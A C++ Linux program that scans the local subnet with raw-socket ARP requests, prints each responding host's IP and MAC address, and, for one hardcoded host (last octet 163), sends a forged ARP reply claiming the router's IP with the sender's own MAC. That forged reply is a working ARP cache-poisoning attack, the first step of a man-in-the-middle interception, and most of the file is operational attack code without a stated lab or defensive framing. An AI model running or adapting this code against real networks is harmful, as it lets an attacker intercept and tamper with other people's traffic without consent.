#include <iostream>
#include <cstdlib>
#include <cstring>
#include <ctime>
#include <iomanip>
#include <thread>

#include <netinet/if_ether.h>
#include <netinet/in.h>

#include <net/if.h>
#include <net/ethernet.h>
#include <net/if_arp.h>
#include <netdb.h>        // hostent

#include <arpa/inet.h>    // inet_addr() ....

#include <linux/if_ether.h>
#include <linux/if_packet.h>

#include <sys/socket.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <sys/unistd.h>   // int gethostname(char *name, size_t len);
using namespace std;

#define BROADCAST_ADDR {0xff, 0xff, 0xff, 0xff, 0xff, 0xff}
#define ETH_ALEN 6
#define IP_ADDR_LEN 4
#define ETHER_HEADER_LEN sizeof(struct ether_header)
#define ETHER_ARP_LEN sizeof(struct ether_arp)
#define ETHER_ARP_PACKET_LEN ETHER_HEADER_LEN+ETHER_ARP_LEN

void socket_init(int& sock_r) {
    sock_r = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
	
    if (sock_r < 0) {
        cout << "Error on socket init!\n";
        exit(1);
    }
}

#define IFNAME "ens33"

void getInfo(char* IP, unsigned char* MC, int& index) {
	string ss = IFNAME;
	char* eth_name = &ss[0];

	struct ifreq ifr;
	int sock_r = socket(AF_INET, SOCK_DGRAM, 0);
	if (sock_r < 0) {
		cout << "Error on socket init!\n";
		exit(1);
	}
	strncpy(ifr.ifr_name, (char*) eth_name, sizeof(ifr.ifr_name));

	if (ioctl(sock_r, SIOCGIFADDR, &ifr) < 0) {
		cout << "Error on itoctl -- IP\n";
		exit(1);
	}
	memcpy(IP, ifr.ifr_addr.sa_data + 2, 4);
	// IP = inet_ntoa(((struct sockaddr_in *)&(ifr.ifr_addr))->sin_addr);

	if (ioctl(sock_r, SIOCGIFINDEX, &ifr) < 0) {
		cout << "Error on itoctl -- IINDEX\n";
		exit(1);
	}
	// cout << "Index: " << ifr.ifr_ifindex << '\n';
	index = ifr.ifr_ifindex;

	if (ioctl(sock_r, SIOCGIFHWADDR, &ifr) < 0) {
		cout << "Error on itoctl -- MAC\n";
		exit(1);
	}
	memcpy(MC, ifr.ifr_hwaddr.sa_data, ETH_ALEN);

	close(sock_r);
	// cout << "Get Info Finished\n";
}

void print_result(unsigned char* dst_ip, unsigned char* mac) {
	string ss = "";
	for (int j = 0; j < 4; j++) {
		if (j != 0) ss = ss +  '.';
		ss = ss + to_string((unsigned int) ((unsigned char) dst_ip[j]));
	}
	cout << setfill(' ') << setw(18) << left << ss;
	
	for (int j = 0; j < ETH_ALEN; j++) {
		if (j != 0) cout << ":";
		cout << setw(2) << setfill('0') << uppercase << hex << (unsigned int)((unsigned char) mac[j]);
	}
	cout << '\n';
}

int finish_scan = 0;

void arpscan_recv(int sock_r, char* src_ip, char* fak_buf, struct sockaddr_ll send_addr) {
	struct timeval tv = { 1, 0 };
	if (setsockopt(sock_r, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv)) < 0) {
		cout << "Error on recv_socket!\n";
	}

	unsigned char rbuf[80];
	while (true) {
		if (recvfrom(sock_r, rbuf, sizeof(rbuf), 0, NULL, NULL) < 0) {
			if (finish_scan == 3) break;
			if (finish_scan) finish_scan += 1;
			// cout << "Nothing got or error!\n";
			continue;
		}

		// Check source ip
		int ok = 1;
		for (int i = 38, j = 0; i < 38 + 4; i++, j++) {
			if ((unsigned int) rbuf[i] != (unsigned int) (unsigned char) src_ip[j]) {
				ok = false;
				// cout << j << ' ' << (unsigned int)rbuf[i] << ' ' << (unsigned int)(unsigned char) src_ip[j] << '\n';
			}
		}
		// Check sender ip (target) != myself or Router
		if (rbuf[31] == src_ip[3] || rbuf[31] == 1) ok = 0;
		if (!ok) continue;

		print_result(rbuf + 28, rbuf + 22);

		if (rbuf[31] != 163) continue;

		struct ether_header* eth_header = (struct ether_header*)(fak_buf);
		struct ether_arp* arp_packet = (struct ether_arp*) (fak_buf + ETHER_HEADER_LEN);
		memcpy(eth_header -> ether_dhost, rbuf + 22, ETH_ALEN);
		memcpy(arp_packet -> arp_tha, rbuf + 22, ETH_ALEN);
		memcpy(arp_packet -> arp_tpa, rbuf + 28, IP_ADDR_LEN);


		if (sendto(sock_r, fak_buf, ETHER_ARP_PACKET_LEN, 0, (struct sockaddr*) &send_addr, sizeof(send_addr)) < 0) {
			cout << "Sendto Error!\n";	
		}
	}
}

void arp_scan() {
	cout << "Avalible devices:\n";    
    cout << "--------------------------------------\n";
    cout << "IP                MAC                 \n";    
    cout << "--------------------------------------\n";

	unsigned char dst_mac_addr[ETH_ALEN] = BROADCAST_ADDR;
	unsigned char src_mac_addr[ETH_ALEN];
	struct in_addr src_in_addr, dst_in_addr;
	char dst_ip[4], src_ip[4], rot_ip[4];
	
	int index;
	getInfo(src_ip, src_mac_addr, index);
	for (int i = 0; i < 3; i++) {
		dst_ip[i] = src_ip[i];
		rot_ip[i] = src_ip[i];
	}
	rot_ip[3] = 1;

	char buf[ETHER_ARP_PACKET_LEN], fak[ETHER_ARP_PACKET_LEN];
	memset(buf, 0, sizeof(buf));

	// Layer 2	
	struct ether_header* eth_header = (struct ether_header*) buf;
	memcpy(eth_header -> ether_dhost, dst_mac_addr, ETH_ALEN);
	memcpy(eth_header -> ether_shost, src_mac_addr, ETH_ALEN);
	eth_header -> ether_type = htons(ETHERTYPE_ARP);	


	// ARP
	struct ether_arp* arp_packet = (struct ether_arp*) malloc(ETHER_ARP_LEN);
	arp_packet -> arp_hrd = htons(ARPHRD_ETHER);
	arp_packet -> arp_pro = htons(ETHERTYPE_IP);
	arp_packet -> arp_hln = ETH_ALEN;
	arp_packet -> arp_pln = IP_ADDR_LEN;
	arp_packet -> arp_op  = htons(ARPOP_REQUEST);
	memcpy(arp_packet -> arp_sha, src_mac_addr, ETH_ALEN);
	memcpy(arp_packet -> arp_tha, dst_mac_addr, ETH_ALEN);
	memcpy(arp_packet -> arp_spa, src_ip, IP_ADDR_LEN);
	memcpy(arp_packet -> arp_tpa, dst_ip, IP_ADDR_LEN);
	memcpy(buf + ETHER_HEADER_LEN, arp_packet, ETHER_ARP_LEN);


	// Fake ARP reply
    memcpy(fak, buf, ETHER_ARP_PACKET_LEN);  
    struct ether_arp* arp_packet_fake = (struct ether_arp*) (fak + ETHER_HEADER_LEN);
    arp_packet_fake -> arp_op  = htons(ARPOP_REPLY);
    memcpy(arp_packet_fake -> arp_spa, rot_ip, IP_ADDR_LEN);


	// Sockaddr
	struct sockaddr_ll send_addr;
	memset(&send_addr, 0, sizeof(send_addr));
    send_addr.sll_family = AF_PACKET;
    send_addr.sll_protocol = htons(ETH_P_ARP);
    send_addr.sll_pkttype = PACKET_BROADCAST;
    send_addr.sll_ifindex = index;
    send_addr.sll_halen = 0x06;
    memset(send_addr.sll_addr, 0xff, 6);

	int sock_r;
	socket_init(sock_r);

    thread recevier(arpscan_recv, sock_r, src_ip, fak, send_addr);
    for (int i = 2; i < 254; i++) {
		dst_ip[3] = i;
		memcpy(arp_packet -> arp_tpa, dst_ip, IP_ADDR_LEN);
		memcpy(buf + ETHER_HEADER_LEN, arp_packet, ETHER_ARP_LEN);

		if (sendto(sock_r, buf, ETHER_ARP_PACKET_LEN, 0, (struct sockaddr*) &send_addr, sizeof(send_addr)) < 0) {
			cout << "Sendto Error!\n";	
		}
		sleep(0.5);
	}
	sleep(3);
	finish_scan = 1;
	recevier.join();

	close(sock_r);
}

int main(int argc, char const *argv[]) {

	arp_scan();


    return 0;
}
